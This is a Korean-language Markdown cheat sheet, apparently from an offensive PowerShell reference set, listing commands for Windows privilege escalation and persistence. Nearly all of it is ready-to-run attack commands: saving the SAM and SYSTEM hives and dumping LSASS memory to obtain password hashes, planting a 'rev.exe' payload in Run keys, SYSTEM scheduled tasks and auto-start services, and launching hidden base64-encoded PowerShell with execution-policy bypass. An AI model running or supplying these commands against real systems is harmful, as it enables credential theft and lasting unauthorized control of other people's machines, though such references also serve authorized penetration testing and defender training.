# PowerShell 권한 상승 / 지속성

레지스트리, 서비스, 예약 작업, 실행 우회, 지속성, 자격 증명 덤프.

> 관련 문서: [PowerShell 치트시트](./README.md) · [파일 조작](./powershell_file_operations.md) · [흔적 제거](./powershell_defense_evasion.md)

## 레지스트리

```powershell
# 서비스 시작 유형 전체 덤프 (약한 권한 서비스 탐색)
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\*\Start

# 레지스트리에서 문자열 검색
reg query HKLM /s /f "password" /t REG_SZ

# 특정 키 값 조회
reg query HKCU /v Password

# SAM 덤프 (계정/패스워드 해시)
reg save HKLM\SAM C:\temp\SAM

# SYSTEM 덤프 (SAM 복호화 키)
reg save HKLM\SYSTEM C:\temp\SYSTEM

# autorun 지속성 등록
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\temp\rev.exe" /f
```

## 서비스

```powershell
Get-Service | Where-Object Status -eq Running

# 서비스 binary 경로/계정 확인 (권한 상승 포인트)
Get-CimInstance Win32_Service | Select-Object Name, StartName, PathName

Start-Service -Name Spooler
Stop-Service -Name Spooler -Force
```

## 예약 작업

```powershell
# 예약된 작업 조회
schtasks /query /fo LIST /v

# 1분마다 SYSTEM 권한으로 실행 (지속성/권한 상승)
schtasks /create /tn svc /tr "C:\temp\rev.exe" /sc minute /mo 1 /ru SYSTEM
```

## 실행 / 권한 상승

```powershell
# UAC 프롬프트로 실행
Start-Process -FilePath .\rev.exe -Verb RunAs

# 숨김 실행 + base64 인코딩
Start-Process powershell -ArgumentList "-ep bypass -enc <BASE64>" -WindowStyle Hidden

# ExecutionPolicy 우회
powershell -ep bypass -f .\script.ps1
powershell -nop -w hidden -enc <BASE64>

Start-Process -FilePath C:\temp\rev.exe -WindowStyle Hidden

# WMI로 프로세스 생성
wmic process call create "C:\temp\rev.exe"
```

## 지속성

```powershell
# Run 키 등록
New-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Updater -Value "C:\temp\rev.exe" -PropertyType String -Force

# 예약 작업 액션 생성
New-ScheduledTaskAction -Execute C:\temp\rev.exe

# SYSTEM 권한 예약 작업 등록
Register-ScheduledTask -TaskName svc -Action (New-ScheduledTaskAction -Execute C:\temp\rev.exe) -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)) -RunLevel Highest -User SYSTEM

# 서비스로 지속성 생성
New-Service -Name svc -BinaryPathName "C:\temp\svc.exe" -DisplayName svc -StartupType Automatic
sc.exe create svc binPath= "C:\temp\svc.exe" start= auto
```

## 자격 증명 덤프

```powershell
# LSASS 메모리 덤프
procdump -ma lsass.exe C:\temp\lsass.dmp

# SAM / SYSTEM (복호화 키) — 위 레지스트리 항목과 함께 사용
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
```
